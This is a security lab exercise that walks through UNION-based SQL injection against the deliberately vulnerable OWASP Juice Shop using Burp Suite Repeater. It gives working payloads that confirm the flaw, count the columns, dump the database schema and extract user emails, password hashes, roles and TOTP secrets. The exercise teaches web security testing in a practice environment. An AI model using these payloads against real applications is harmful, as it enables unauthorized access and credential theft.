# Exercise 11: Extract Database Schema & User Credentials via SQL Injection

## Objective
Exploit a **UNION-based SQL Injection** vulnerability in **OWASP Juice Shop** to:
- Confirm SQL Injection
- Enumerate the database schema
- Extract user credentials

---

# Tools Used

- OWASP Juice Shop
- Burp Suite (Proxy, HTTP History, Repeater)

---

# Step 1: Start Juice Shop

On Ubuntu:

```bash
sudo docker run -d -p 80:3000 bkimminich/juice-shop
```

If port 80 is busy:

```bash
service apache2 stop
```

---

# Step 2: Open Juice Shop

From Parrot:

```
http://192.168.0.19
```

Login using your Juice Shop account.

Add **Apple Juice** to the basket.

---

# Step 3: Capture the Search Request

Open **Burp Suite**

- Proxy → HTTP History
- Find:

```
GET /rest/products/search?q=
```

Status Code:

```
304
```

Right-click →

```
Send to Repeater
```

---

# Step 4: Test for SQL Injection

In Repeater:

Original:

```
apple
```

Send.

Now append a single quote:

```
apple'
```

Click **Send**.

If response contains:

```
SQLITE_ERROR
```

SQL Injection is confirmed.

---

# Step 5: Confirm Further

Try payloads like:

```
--
```

or

```
))
```

Different SQL errors indicate the backend is processing our input.

---

# Step 6: Enumerate Database

Try:

```
UNION SELECT * FROM sqlite_master--
```

This usually returns a column mismatch error.

---

# Step 7: Find Number of Columns

Increase columns until the error disappears.

Working payload:

```
UNION SELECT 1,2,3,4,5,6,7,8,9 FROM sqlite_master--
```

**Number of Columns = 9**

---

# Step 8: Extract Database Schema

Replace one column with:

```
sql
```

Payload:

```
/rest/products/search?q=apple'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--
```

This displays the SQL schema.

---

# Step 9: Dump User Credentials

Retrieve data from the **Users** table.

Payload:

```
UNION SELECT id,email,password,role,isActive,username,createdAt,deletedAt,totpSecret FROM Users----
```

This displays:

- User ID
- Email
- Password Hash
- Username
- Role
- Active Status
- TOTP Secret

# Key Learning

- A single quote (`'`) is used to test for SQL Injection.
- `sqlite_master` stores the database schema in SQLite.
- `UNION SELECT` requires the same number of columns as the original query.
- Once the schema is known, attackers can extract sensitive tables such as `Users`.
